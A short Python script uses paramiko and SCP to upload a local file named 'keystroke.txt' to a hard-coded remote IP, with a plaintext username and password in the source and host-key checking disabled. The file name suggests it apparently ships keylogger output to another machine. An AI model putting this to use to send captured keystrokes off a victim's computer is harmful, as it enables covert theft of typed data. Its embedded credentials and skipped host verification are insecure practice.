import paramiko
from scp import SCPClient

# SSH Configuration
REMOTE_HOST = "172.17.36.122"  # Replace with your remote PC's IP
REMOTE_PORT = 22  # Default SSH port
USERNAME = "hiyanshu"  # Replace with your SSH username
PASSWORD = "Goku89"  # Replace with your SSH password (use key-based auth for better security)

# File to Send
LOCAL_FILE = "keystroke.txt"  # File on your local system
REMOTE_FILE_PATH = r"C:\Users\user\Desktop"  # Path to save the file on the remote system

def ssh_connect_and_send_file():
    try:
        # Create SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Connect to the remote host
        print(f"Connecting to {REMOTE_HOST}...")
        ssh_client.connect(
            hostname=REMOTE_HOST,
            port=REMOTE_PORT,
            username=USERNAME,
            password=PASSWORD  # Use a private key file for better security
            # key_filename="/path/to/private/key"  # Uncomment for key-based auth
        )
        print("Connected successfully.")
        
        # Use SCP to send the file
        with SCPClient(ssh_client.get_transport()) as scp:
            print(f"Sending file {LOCAL_FILE} to {REMOTE_FILE_PATH}...")
            scp.put(LOCAL_FILE, REMOTE_FILE_PATH)
            print("File sent successfully.")
        
        # Optional: Execute a command on the remote PC
        # command = "ls -l /home/your_username"  # Replace with your desired command
        # stdin, stdout, stderr = ssh_client.exec_command(command)
        # print("Command output:")
        # print(stdout.read().decode())
        # print("Command error (if any):")
        # print(stderr.read().decode())
    
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        ssh_client.close()
        print("Connection closed.")

if __name__ == "__main__":
    ssh_connect_and_send_file()
